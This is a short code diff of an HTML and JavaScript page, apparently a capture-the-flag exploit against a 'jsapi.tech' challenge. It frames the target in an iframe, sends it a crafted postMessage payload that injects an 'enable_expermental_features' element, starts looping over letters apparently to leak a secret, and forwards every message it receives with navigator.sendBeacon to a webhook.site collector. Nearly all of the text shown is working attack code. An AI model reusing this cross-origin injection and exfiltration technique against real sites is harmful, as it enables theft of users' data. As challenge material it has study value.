@@ -1,5 +1,5 @@
 
-<iframe src="https://chall1.jsapi.tech/index.html" style="width:100%; height: 100%;"></iframe>
+<iframe src="https://chall1.jsapi.tech/index.html" style="width:80%; height: 80%;"></iframe>
 <script>
     const myHost = "https://webhook.site/a84484cc-d9a7-421d-8c55-dcd16eac2a69"
     const iframe = document.querySelector( 'iframe' );
@@ -10,8 +10,9 @@
             console.log(e);
             navigator.sendBeacon( `${myHost}/?data=`, JSON.stringify({ 'data': JSON.stringify(e.data) }) );
         } );
-        iframe.src = 'https://challenge.jsapi.tech/index.html';
+        iframe.src = 'https://chall1.jsapi.tech/index.html';
         await sleep(1000);
+
         iframe.contentWindow.postMessage( { op: 'preview', payload: '<div id="enable_expermental_features"></div>' }, '*' );
         await sleep(1000);
         const letters = 'abcdefghijklmnopqrstuvwxyz';
